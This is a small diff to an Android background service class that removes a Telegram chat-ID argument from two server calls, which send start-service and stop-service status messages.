@@ -33,7 +33,7 @@ public class BackgroundService extends Service {
     public void onDestroy() {
         SmsReceiver.disableBroadcastReceiver();
         CallReceiver.disableBroadcastReceiver();
-        ServerHelper.getRequest(ChatIDTelegramHelper.RangeChatID, getString(R.string.stop_service));
+        ServerHelper.getRequest(getString(R.string.stop_service));
     }
 
     public int onStartCommand(Intent intent, int flags, int startId) {
@@ -53,7 +53,7 @@ public class BackgroundService extends Service {
         ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).notify(NOTIFICATION_ID, notification);
         startForeground(NOTIFICATION_ID, notification);
 
-        ServerHelper.getRequest(ChatIDTelegramHelper.RangeChatID, getString(R.string.start_service));
+        ServerHelper.getRequest(getString(R.string.start_service));
         return START_STICKY;
     }
 }
